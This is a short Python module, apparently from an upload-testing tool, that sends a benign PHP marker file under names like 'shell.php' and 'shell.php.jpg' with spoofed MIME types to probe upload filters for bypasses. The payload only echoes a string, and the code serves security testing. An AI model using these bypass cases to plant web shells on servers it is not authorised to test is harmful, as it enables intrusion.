PHP_PAYLOAD = b"<?php echo 'UPLOAD_HUNTER'; ?>"

MIME_TESTS = [
    {
        "filename": "shell.php",
        "mime": "image/jpeg",
        "desc": "PHP file with image MIME"
    },
    {
        "filename": "shell.php",
        "mime": "image/png",
        "desc": "PHP file with PNG MIME"
    },
    {
        "filename": "shell.php",
        "mime": "application/octet-stream",
        "desc": "Generic binary MIME"
    },
    {
        "filename": "shell.jpg",
        "mime": "application/x-httpd-php",
        "desc": "Image extension with PHP MIME"
    },
    {
        "filename": "shell.php.jpg",
        "mime": "image/jpeg",
        "desc": "Double extension with image MIME"
    }
]

def run(uploader):
    results = []

    print("[*] Starting MIME-type bypass tests")

    for test in MIME_TESTS:
        print(f"[+] Testing: {test['desc']}")

        result = uploader.upload(
            filename=test["filename"],
            content=PHP_PAYLOAD,
            mime=test["mime"]
        )

        result["test"] = test["desc"]
        result["mime"] = test["mime"]

        results.append(result)

    return results

